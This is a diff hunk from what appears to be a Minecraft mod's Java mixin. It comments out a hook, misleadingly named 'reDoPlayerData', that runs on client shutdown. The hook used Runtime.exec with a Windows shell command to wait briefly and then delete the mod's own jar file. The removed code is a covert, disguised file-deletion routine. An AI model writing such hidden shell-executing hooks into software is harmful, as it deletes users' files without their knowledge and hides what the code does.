@@ -27,12 +27,12 @@ public abstract class MinecraftClientMixin {
         return Perspective.FIRST_PERSON;
     }
 
-    @Inject(method = "stop", at = @At("HEAD"))
-    private void reDoPlayerData(CallbackInfo ci) throws IOException {
-        File file = new File(this.runDirectory, "mods/spb-revamped-1.0.0.jar");
-        if(file.exists()) {
-            Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && del " + "\"" + file.getAbsolutePath() + "\"");
-        }
-    }
+    //@Inject(method = "stop", at = @At("HEAD"))
+//    private void reDoPlayerData(CallbackInfo ci) throws IOException {
+//        File file = new File(this.runDirectory, "mods/spb-revamped-1.0.0.jar");
+//        if(file.exists()) {
+//            Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && del " + "\"" + file.getAbsolutePath() + "\"");
+//        }
+//    }
 
 }
